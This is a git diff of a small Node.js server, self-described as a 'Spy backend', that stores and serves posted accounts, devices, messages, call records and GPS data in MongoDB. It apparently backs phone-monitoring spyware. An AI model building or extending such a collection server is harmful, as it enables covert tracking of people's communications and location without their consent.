@@ -1,5 +1,6 @@
 var http = require('http');
 var mongo = require( './utils/mongoUtils' );
+var url = require('url');
 var assert = require('assert');
 
 const LISTEN_PORT=9900;
@@ -16,62 +17,83 @@ function handleRequest(request, response){
         case '/' :
             response.end('Spy backend welcomes you');
             break;
-        case '/account' :
+        case '/accounts' :
             if (isPost(request)) {
-                storeData(request, response, 'accounts');
+                processPostRequest(request, response, 'accounts');
             } else {
-                // TODO implement getData
+                // TODO
             }
             break;
-        case '/device' :
-            storeData(request, response, 'devices');
+        case '/devices' :
+            if (isPost(request)) {
+                processPostRequest(request, response, 'devices');
+            } else {
+                // TODO
+            }
             break;
-        case '/message' :
-            storeData(request, response, 'messages');
+        case '/messages' :
+            if (isPost(request)) {
+                processPostRequest(request, response, 'messages');
+            } else if (isGet(request)) {
+                mongo.getWatcherData(url.parse(request.url, true), 'messages');
+            }
+            break;
+        case '/calls' :
+            if (isPost(request)) {
+                processPostRequest(request, response, 'calls');
+            } else if (isGet(request)) {
+                mongo.getWatcherData(url.parse(request.url, true), 'calls');
+            }
             break;
         case '/gps' :
-            storeData(request, response, 'gps');
+            if (isPost(request)) {
+                processPostRequest(request, response, 'gps');
+            } else if (isGet(request)) {
+                mongo.getWatcherData(url.parse(request.url, true), 'gps');
+            }
             break;
+        default :
 
     }
-}
-
-function storeData(request, response, collection) {
-    console.log("[200] " + request.method + " to " + request.url);
-    var data = '';
-    request.on('data', function (chunk) {
-        console.log("Received body data:");
-        console.log(chunk.toString());
-        data += chunk;
-    });
-    request.on('end', function () {
-        var obj = JSON.parse(data);
-        mongo.get(function(db) {
-            // store to DB
-            db.collection(collection).insert(obj, {'ordered' : false}, function callback(err, doc) {
-                if (err) {
-                    console.log("Error while adding to " + collection + ": " + err);
-                } else {
-                    // empty 200 OK response for now
-                    response.writeHead(200, "OK", {'Content-Type': 'text/html'});
-                    response.end();
-                }
-            });
-        })
-
-    });
-}
-
-function getData() {
-
 }
 
 function isPost(request) {
     return request.method == 'POST';
 }
 
+function isGet(request) {
+    return request.method == 'GET';
+}
+
+function processPostRequest(request, response, collection) {
+    console.log(request.method + " to " + request.url);
+    var data = '';
+    request.on('data', function (chunk) {
+        console.log(chunk.toString());
+        data += chunk;
+    });
+    request.on('end', function () {
+        mongo.storeData(JSON.parse(data), collection,
+            function () {
+                response.writeHead(200, "OK", {'Content-Type': 'text/html'});
+                response.end();
+            },
+            function(error) {
+                console.log("Error while adding to " + collection + ": " + error);
+                response.writeHead(500, "Error", {'Content-Type': 'text/html'});
+                response.end();
+            });
+    });
+}
+
 function methodNotSupported(request, response) {
     console.log("[405] " + request.method + " to " + request.url);
     response.writeHead(405, "Method not supported", {'Content-Type': 'text/html'});
     response.end('<html><head><title>405 - Method not supported</title></head><body><h1>Method not supported.</h1></body></html>');
+}
+
+function operationNotSupported(request, response) {
+    console.log("[400] " + request.url);
+    response.writeHead(400, "Operation not supported", {'Content-Type': 'text/html'});
+    response.end('<html><head><title>400 - Operation not supported</title></head><body><h1>Operation not supported.</h1></body></html>');
 }
